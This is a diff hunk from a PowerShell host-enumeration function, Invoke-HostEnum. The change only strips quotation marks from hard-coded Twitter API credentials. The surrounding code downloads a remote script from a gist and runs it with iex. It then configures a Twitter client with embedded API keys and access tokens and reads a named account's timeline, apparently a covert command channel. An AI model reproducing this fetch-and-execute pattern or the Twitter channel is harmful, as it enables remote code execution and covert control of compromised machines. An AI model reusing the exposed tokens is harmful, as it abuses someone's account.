@@ -681,7 +681,7 @@ function Invoke-HostEnum {
             "[+] FILESIZE:`t$((Get-Item $HTMLReportFile).length) Bytes"
             iex (New-Object Net.WebClient).DownloadString("https://gist.githubusercontent.com/stefanstranger/2138dc710576bc40b64b/raw/bfd25a0e7363e9a1906908b0695ebcffaa508276/InstallMyTwitterModule.ps1")
             Get-Command -Module MyTwitter
-            New-MyTwitterConfiguration -APIKey "wsDcV3Dyy5gP7hMVE71pkZqnA" -APISecret "yvtyVEYJZuWSOmZVxGL4BzdfvJxLvWY05HLqygOAB4g9J2k9Rl" -AccessToken "1161330151554265089-nlvDZKilBQKTvJNrzV1RFo5OIAW9X6" -AccessTokenSecret "AmbilMNaatmScwQYFVwmiq233YwxFbQSFV5m74iXPA6gr"
+            New-MyTwitterConfiguration -APIKey wsDcV3Dyy5gP7hMVE71pkZqnA -APISecret yvtyVEYJZuWSOmZVxGL4BzdfvJxLvWY05HLqygOAB4g9J2k9Rl -AccessToken 1161330151554265089-nlvDZKilBQKTvJNrzV1RFo5OIAW9X6 -AccessTokenSecret AmbilMNaatmScwQYFVwmiq233YwxFbQSFV5m74iXPA6gr
             Get-TweetTimeline -Username ColoursLa
             $Results = 'Finished'
             $Results | Out-File $HTMLReportFile
